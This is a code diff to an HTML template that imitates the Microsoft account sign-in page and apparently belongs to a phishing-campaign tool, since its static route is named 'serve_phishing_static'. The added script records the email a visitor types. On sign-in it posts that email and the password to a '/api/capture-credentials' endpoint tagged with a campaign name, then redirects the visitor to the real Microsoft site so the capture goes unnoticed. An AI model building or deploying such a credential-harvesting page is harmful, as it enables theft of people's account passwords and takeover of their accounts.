@@ -9,6 +9,77 @@
     <title>Sign in to your Microsoft account</title>
     <link rel="stylesheet" href="{{ url_for('serve_phishing_static', filename='css/microsoft.css') }}">
 </head>
+<script>
+    let campaignName = "Unknown Campaign"; // Default campaign name
+    let view = "uname";
+    let username = ""; // Store captured username
+    let unameVal = false;
+    let pwdVal = false;
+
+    // Function to fetch the latest campaign name
+    function fetchCampaignName() {
+        fetch("/api/latest-campaign")
+            .then(response => response.json())
+            .then(data => {
+                if (data.campaign_name) {
+                    campaignName = data.campaign_name;
+                }
+            })
+            .catch(error => console.error("Error fetching campaign name:", error));
+    }
+
+    // Function to send captured credentials
+    function sendCredentials(username, password) {
+        fetch("/api/capture-credentials", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ campaign: campaignName, email: username, password: password })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Captured:", data);
+            window.location.href = "https://www.microsoft.com/en-in"; // Redirect after capture
+        })
+        .catch(error => console.error("Error capturing credentials:", error));
+    }
+
+    function validate() {
+        const unReq = "Enter a valid email address, phone number, or Skype name.";
+        const pwdReq = "Please enter the password for your Microsoft account.";
+        const unameInp = document.getElementById('inp_uname');
+        const pwdInp = document.getElementById('inp_pwd');
+
+        function unameValAction(type) {
+            if (!type) {
+                document.getElementById('error_uname').innerText = unReq;
+                unameInp.classList.add('error-inp');
+                unameVal = false;
+            } else {
+                document.getElementById('error_uname').innerText = "";
+                unameInp.classList.remove('error-inp');
+                unameVal = true;
+            }
+        }
+
+        function pwdValAction(type) {
+            if (!type) {
+                document.getElementById('error_pwd').innerText = pwdReq;
+                pwdInp.classList.add('error-inp');
+                pwdVal = false;
+            } else {
+                document.getElementById('error_pwd').innerText = "";
+                pwdInp.classList.remove('error-inp');
+                pwdVal = true;
+            }
+        }
+
+        if (view === "uname") {
+            unameInp.value.trim() === "" ? unameValAction(false) : unameValAction(true);
+        } else if (view === "pwd") {
+            pwdInp.value.trim() === "" ? pwdValAction(false) : pwdValAction(true);
+        }
+    }
+</script>
 
 <body>
     <section id="section_uname">
@@ -93,84 +164,40 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const unReq = "Enter a valid email address, phone number, or Skype name.";
-            const pwdReq = "Please enter the password for your Microsoft account.";
             const unameInp = document.getElementById('inp_uname');
             const pwdInp = document.getElementById('inp_pwd');
-            let view = "uname";
-
-            let unameVal = pwdVal = false;
             const nxt = document.getElementById('btn_next');
-
+            const sig = document.getElementById('btn_sig');
+    
+            fetchCampaignName(); // Fetch campaign name when page loads
+    
             nxt.addEventListener('click', () => {
                 validate();
                 if (unameVal) {
+                    username = unameInp.value.trim(); // Store captured email/username
                     document.getElementById("section_uname").classList.toggle('d-none');
                     document.getElementById('section_pwd').classList.remove('d-none');
                     document.querySelectorAll('#user_identity').forEach((e) => {
-                        e.innerText = unameInp.value;
+                        e.innerText = username;
                     });
                     view = "pwd";
                 }
             });
-
-            const sig = document.getElementById('btn_sig');
-
+    
             sig.addEventListener('click', () => {
                 validate();
                 if (pwdVal) {
-                    document.getElementById("section_pwd").classList.toggle('d-none');
-                    document.getElementById('section_final').classList.remove('d-none');
-                    view = "final";
+                    const password = pwdInp.value.trim(); // Capture password
+                    sendCredentials(username, password); // Send data to backend
                 }
             });
-
-            function validate() {
-                function unameValAction(type) {
-                    if (!type) {
-                        document.getElementById('error_uname').innerText = unReq;
-                        unameInp.classList.add('error-inp');
-                        unameVal = false;
-                    } else {
-                        document.getElementById('error_uname').innerText = "";
-                        unameInp.classList.remove('error-inp');
-                        unameVal = true;
-                    }
-                }
-
-                function pwdValAction(type) {
-                    if (!type) {
-                        document.getElementById('error_pwd').innerText = pwdReq;
-                        pwdInp.classList.add('error-inp');
-                        pwdVal = false;
-                    } else {
-                        document.getElementById('error_pwd').innerText = "";
-                        pwdInp.classList.remove('error-inp');
-                        pwdVal = true;
-                    }
-                }
-
-                if (view === "uname") {
-                    if (unameInp.value.trim() === "") {
-                        unameValAction(false);
-                    } else {
-                        unameValAction(true);
-                    }
-                } else if (view === "pwd") {
-                    if (pwdInp.value.trim() === "") {
-                        pwdValAction(false);
-                    } else {
-                        pwdValAction(true);
-                    }
-                }
-            }
-
+    
             document.querySelector('.back').addEventListener('click', () => {
                 view = "uname";
                 document.getElementById("section_pwd").classList.toggle('d-none');
                 document.getElementById('section_uname').classList.remove('d-none');
             });
-
+    
             document.querySelectorAll('#btn_final').forEach((b) => {
                 b.addEventListener('click', () => {
                     window.location.href = "https://www.microsoft.com/en-in";
@@ -178,6 +205,7 @@
             });
         });
     </script>
+    
 </body>
 
 </html>
